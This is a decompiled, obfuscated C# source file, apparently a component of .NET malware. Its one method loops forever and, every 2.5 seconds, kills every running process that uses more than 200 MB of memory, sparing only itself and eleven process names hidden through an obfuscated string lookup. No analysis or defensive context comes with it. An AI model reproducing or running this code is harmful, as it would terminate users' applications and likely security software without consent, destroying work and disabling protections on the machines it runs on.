using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace FEPAnxLYcpgz;

public static class StJPYugsoqIIcm
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void wmBjJCvyJND()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107474600)) && !process.ProcessName.Contains(getString_0(107474623)) && !process.ProcessName.Contains(getString_0(107474614)) && !process.ProcessName.Contains(getString_0(107474573)) && !process.ProcessName.Contains(getString_0(107474592)) && !process.ProcessName.Contains(getString_0(107474547)) && !process.ProcessName.Contains(getString_0(107474534)) && !process.ProcessName.Contains(getString_0(107474553)) && !process.ProcessName.Contains(getString_0(107474508)) && !process.ProcessName.Contains(getString_0(107474527)) && !process.ProcessName.Contains(getString_0(107474474)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static StJPYugsoqIIcm()
	{
		Strings.CreateGetStringDelegate(typeof(StJPYugsoqIIcm));
	}
}
